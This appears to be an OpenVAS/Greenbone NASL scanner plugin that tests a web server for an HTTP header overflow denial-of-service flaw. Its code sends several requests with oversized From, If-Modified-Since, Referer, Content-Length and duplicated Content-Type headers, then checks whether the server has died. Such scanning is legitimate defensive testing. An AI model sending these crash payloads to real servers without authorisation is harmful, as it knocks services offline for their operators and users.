# SPDX-FileCopyrightText: 2005 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11127");
  script_version("2025-01-31T05:37:27+0000");
  script_tag(name:"last_modification", value:"2025-01-31 05:37:27 +0000 (Fri, 31 Jan 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("HTTP 1.0 Header Overflow DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_analysis");
  # All the www_too_long_*.nasl scripts were first declared as
  # ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
  # The web server might be killed by those generic tests before the scanner
  # has a chance to perform known attacks for which a patch exists
  # As ACT_DENIAL are performed one at a time (not in parallel), this reduces
  # the risk of false positives.

  script_copyright("Copyright (C) 2005 Michel Arboi");
  script_family("Gain a shell remotely");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade your software or protect it with a filtering reverse
  proxy.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"It was possible to kill the web server by sending an invalid
  request with a too long header (From, If-Modified-Since, Referer or Content-Type).");

  script_tag(name:"impact", value:"An attacker may exploit this vulnerability to make your web
  server crash continually or even execute arbitrary code on the target system.");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

host = http_host_name(port:port);

if(http_is_dead(port:port))
  exit(0);

soc = http_open_socket(port);
if(!soc)
  exit(0);

r1 = http_get(item:"/", port:port);
r1 = r1 - string("\r\n\r\n");
r1 = r1 + string("\r\n");

r = string(r1, "From: ", crap(1024), "@", crap(1024), ".org\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket:soc);
close(soc);

soc = http_open_socket(port);
if (! soc)  {  security_message(port); exit(0); }

r = string(r1, "If-Modified-Since: Sat, 29 Oct 1994 19:43:31 ",
           crap(data: "GMT", length: 1024), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket:soc);
close(soc);

soc = http_open_socket(port);
if (! soc)  {  security_message(port); exit(0); }

r = string(r1, "Referer: http://", crap(4096), "/\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket:soc);
close(soc);


soc = http_open_socket(port);
if (! soc)  {  security_message(port); exit(0); }

r = string(r1, "Referer: http://", host, "/", crap(4096), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket:soc);
close(soc);


soc = http_open_socket(port);
if (! soc)  {  security_message(port); exit(0); }

r = string(r1, "Content-Length: ", crap(4096, data: "123456789"), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket:soc);
close(soc);

soc = http_open_socket(port);
if (! soc)  {  security_message(port); exit(0); }

# Note that the message on VULN-DEV did not say that it was possible to
# *crash* IIS. I put it here just in case...

r = string(r1, "Content-Type: application/x-www-form-urlencoded\r\n",
          "Content-Length: 56\r\n",
          # Yes, Content-Type appears twice!
          "Accept-Language: en",
          "Content-Type:", crap(32769), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket:soc);
close(soc);


if (http_is_dead(port: port)) {  security_message(port); exit(0); }
